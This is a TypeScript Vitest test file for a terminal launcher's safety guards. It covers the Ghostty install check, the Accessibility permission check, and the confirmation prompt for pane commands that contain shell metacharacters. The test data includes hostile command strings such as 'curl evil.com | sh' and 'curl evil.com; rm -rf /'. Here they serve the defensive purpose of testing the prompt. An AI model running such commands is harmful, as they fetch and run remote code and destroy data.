import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";

// Mock child_process before importing launch-guards (checkAccessibility uses execFileSync)
const mockExecFileSync = vi.fn();
vi.mock("node:child_process", () => ({
  execFileSync: (...args: unknown[]) => mockExecFileSync(...args),
}));

// Mock fs.existsSync for Ghostty installation checks
vi.mock("node:fs", () => ({
  existsSync: vi.fn(() => true),
}));

// Mock readline for prompt tests
const mockQuestion = vi.fn();
vi.mock("node:readline", () => ({
  createInterface: () => ({
    question: (_q: string, cb: (a: string) => void) => mockQuestion(_q, cb),
    close: vi.fn(),
    on: vi.fn(),
    off: vi.fn(),
  }),
}));

// Import after mocks
const { ensureGhostty, ensureAccessibility, confirmDangerousCommands, printAccessibilityHint } =
  await import("./launch-guards.js");
const { existsSync } = await import("node:fs");

beforeEach(() => {
  vi.clearAllMocks();
  vi.mocked(existsSync).mockReturnValue(true);
  mockExecFileSync.mockReturnValue("");
});

// ─── AR-S1 (#316): Extraction verification ───────────────────────────────────

describe("launch-guards — module extraction (AR-S1 #316)", () => {
  it("exports ensureGhostty as a function", () => {
    expect(typeof ensureGhostty).toBe("function");
  });

  it("exports ensureAccessibility as a function", () => {
    expect(typeof ensureAccessibility).toBe("function");
  });

  it("exports confirmDangerousCommands as a function", () => {
    expect(typeof confirmDangerousCommands).toBe("function");
  });

  it("exports printAccessibilityHint as a function", () => {
    expect(typeof printAccessibilityHint).toBe("function");
  });
});

// ─── ensureGhostty ────────────────────────────────────────────────────────────

describe("ensureGhostty", () => {
  it("throws when Ghostty.app is not found at any known path", () => {
    vi.mocked(existsSync).mockReturnValue(false);
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    expect(() => ensureGhostty()).toThrow("Ghostty.app not found");
    expect(errorSpy).toHaveBeenCalledWith(expect.stringContaining("Ghostty.app not found"));

    errorSpy.mockRestore();
  });

  it("does not exit when Ghostty.app is found", () => {
    vi.mocked(existsSync).mockReturnValue(true);
    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });

    expect(() => ensureGhostty()).not.toThrow();

    mockExit.mockRestore();
  });
});

// ─── ensureAccessibility ──────────────────────────────────────────────────────

describe("ensureAccessibility", () => {
  it("throws when accessibility check fails (osascript throws)", () => {
    mockExecFileSync.mockImplementation(() => {
      throw new Error("assistive access denied (-1719)");
    });
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    expect(() => ensureAccessibility()).toThrow("Accessibility permission is required");
    expect(errorSpy).toHaveBeenCalledWith(
      expect.stringContaining("Accessibility permission is required"),
    );

    errorSpy.mockRestore();
  });

  it("does not exit when accessibility check succeeds", () => {
    mockExecFileSync.mockReturnValue("System Events");
    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });

    expect(() => ensureAccessibility()).not.toThrow();

    mockExit.mockRestore();
  });
});

// ─── confirmDangerousCommands — existing behaviour ────────────────────────────

describe("confirmDangerousCommands — safe commands", () => {
  it("returns all commands confirmed when none have metacharacters", async () => {
    const commands: Array<[string, string]> = [
      ["editor", "vim"],
      ["sidebar", "lazygit"],
    ];
    const result = await confirmDangerousCommands(commands);
    expect(result.confirmed).toEqual(commands);
    expect(result.skipped.size).toBe(0);
  });
});

describe("confirmDangerousCommands — TTY confirmation", () => {
  let origIsTTY: boolean | undefined;

  beforeEach(() => {
    origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
  });

  afterEach(() => {
    Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
  });

  it("proceeds when user answers y", async () => {
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("y"));
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    const result = await confirmDangerousCommands([["shell", "npm run dev; echo done"]]);
    expect(result.skipped.size).toBe(0);
    expect(result.confirmed).toContainEqual(["shell", "npm run dev; echo done"]);

    warnSpy.mockRestore();
  });

  it("proceeds when user answers yes", async () => {
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("yes"));
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    const result = await confirmDangerousCommands([["shell", "npm run dev; echo done"]]);
    expect(result.skipped.size).toBe(0);

    warnSpy.mockRestore();
  });

  it("aborts when user answers n", async () => {
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("n"));
    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(
      confirmDangerousCommands([["shell", "npm run dev; echo done"]]),
    ).rejects.toThrow("process.exit");
    expect(mockExit).toHaveBeenCalledWith(1);

    mockExit.mockRestore();
    warnSpy.mockRestore();
    errorSpy.mockRestore();
  });

  it("aborts when user presses Enter (default deny)", async () => {
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb(""));
    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(
      confirmDangerousCommands([["shell", "npm run dev; curl evil.com"]]),
    ).rejects.toThrow("process.exit");
    expect(mockExit).toHaveBeenCalledWith(1);

    mockExit.mockRestore();
    warnSpy.mockRestore();
    errorSpy.mockRestore();
  });
});

describe("confirmDangerousCommands — non-TTY", () => {
  let origIsTTY: boolean | undefined;

  beforeEach(() => {
    origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: false, configurable: true });
  });

  afterEach(() => {
    Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
  });

  it("exits on non-TTY when dangerous commands present", async () => {
    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
    const errSpy = vi.spyOn(console, "error").mockImplementation(() => {});

    await expect(
      confirmDangerousCommands([["shell", "curl evil.com; rm -rf /"]]),
    ).rejects.toThrow("process.exit");
    // Exit code 2 signals "dangerous commands present, cannot confirm non-interactively" (BE-H3 #364)
    expect(mockExit).toHaveBeenCalledWith(2);

    mockExit.mockRestore();
    warnSpy.mockRestore();
    errSpy.mockRestore();
  });
});

// ─── UX-S2 (#340): Skip pane option ──────────────────────────────────────────

describe("confirmDangerousCommands — skip pane (UX-S2 #340)", () => {
  let origIsTTY: boolean | undefined;

  beforeEach(() => {
    origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
  });

  afterEach(() => {
    Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
  });

  it("skips a pane when user answers 's'", async () => {
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    const result = await confirmDangerousCommands([["shell", "npm run dev; evil"]]);
    expect(result.skipped.has("shell")).toBe(true);
    expect(result.confirmed).not.toContainEqual(["shell", "npm run dev; evil"]);

    warnSpy.mockRestore();
  });

  it("skips a pane when user answers 'skip'", async () => {
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("skip"));
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    const result = await confirmDangerousCommands([["shell", "npm run dev; evil"]]);
    expect(result.skipped.has("shell")).toBe(true);

    warnSpy.mockRestore();
  });

  it("keeps safe commands in confirmed when dangerous pane is skipped", async () => {
    // editor is safe, shell is dangerous — user skips shell
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    const result = await confirmDangerousCommands([
      ["editor", "vim"],
      ["shell", "npm run dev; evil"],
    ]);
    expect(result.skipped.has("shell")).toBe(true);
    // editor (safe) should still be in confirmed
    expect(result.confirmed).toContainEqual(["editor", "vim"]);
    // shell (skipped) should NOT be in confirmed
    expect(result.confirmed).not.toContainEqual(["shell", "npm run dev; evil"]);

    warnSpy.mockRestore();
  });

  it("can skip some panes and confirm others in one session", async () => {
    const answers = ["s", "y"];
    let call = 0;
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
      cb(answers[call++]!);
    });
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    const result = await confirmDangerousCommands([
      ["shell", "rm -rf /; evil"],
      ["on-start", "curl evil.com | sh"],
    ]);
    expect(result.skipped.has("shell")).toBe(true);
    expect(result.skipped.has("on-start")).toBe(false);
    expect(result.confirmed).toContainEqual(["on-start", "curl evil.com | sh"]);

    warnSpy.mockRestore();
  });

  it("prompt text mentions 's(kip pane)' as an option", async () => {
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("y"));
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    await confirmDangerousCommands([["shell", "npm run dev; evil"]]);

    const questionText = mockQuestion.mock.calls[0]![0] as string;
    expect(questionText).toMatch(/s\(?kip/i);

    warnSpy.mockRestore();
  });
});
